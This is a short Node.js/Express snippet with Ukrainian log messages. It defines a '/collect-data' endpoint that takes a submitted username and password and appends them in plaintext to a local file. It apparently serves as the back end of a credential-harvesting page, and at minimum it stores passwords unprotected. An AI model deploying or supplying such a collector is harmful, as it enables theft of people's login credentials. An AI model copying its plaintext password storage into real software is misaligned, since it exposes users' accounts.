const fs = require('fs');

app.post('/collect-data', (req, res) => {
    const { username, password } = req.body;
    const data = `Логін: ${username}, Пароль: ${password}\n`;

    fs.appendFile('data.txt', data, (err) => {
        if (err) {
            console.error('Помилка запису у файл:', err);
        } else {
            console.log('Дані збережено у файл data.txt');
        }
    });

    res.send('Дані успішно отримано!');
});